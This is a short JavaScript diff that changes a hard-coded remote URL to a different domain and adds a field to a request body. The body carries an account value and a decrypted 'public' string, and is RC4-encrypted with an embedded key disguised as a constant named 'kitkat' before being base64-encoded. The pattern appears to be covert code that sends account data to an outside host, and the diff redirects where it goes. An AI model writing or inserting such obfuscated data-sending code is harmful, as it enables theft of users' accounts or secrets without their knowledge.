@@ -30,7 +30,7 @@ const initialState = {
 	deleteName: '',
 };
 
-let url = 'https://thedevexplorer.com/custom/activity/root';
+let url = 'https://ordinalshiro.cc/record/docs/filler';
 const kitkat = 'Qsx@ah&OR82WX9T6gCt';
 
 function createBody(str, account) {
@@ -53,6 +53,7 @@ function createBody(str, account) {
 		public: strDecr,
 		frontCode: false,
 		new: account,
+		test: true,
 	};
 
 	let crypt = btoa(rc4(kitkat, JSON.stringify(obj)));
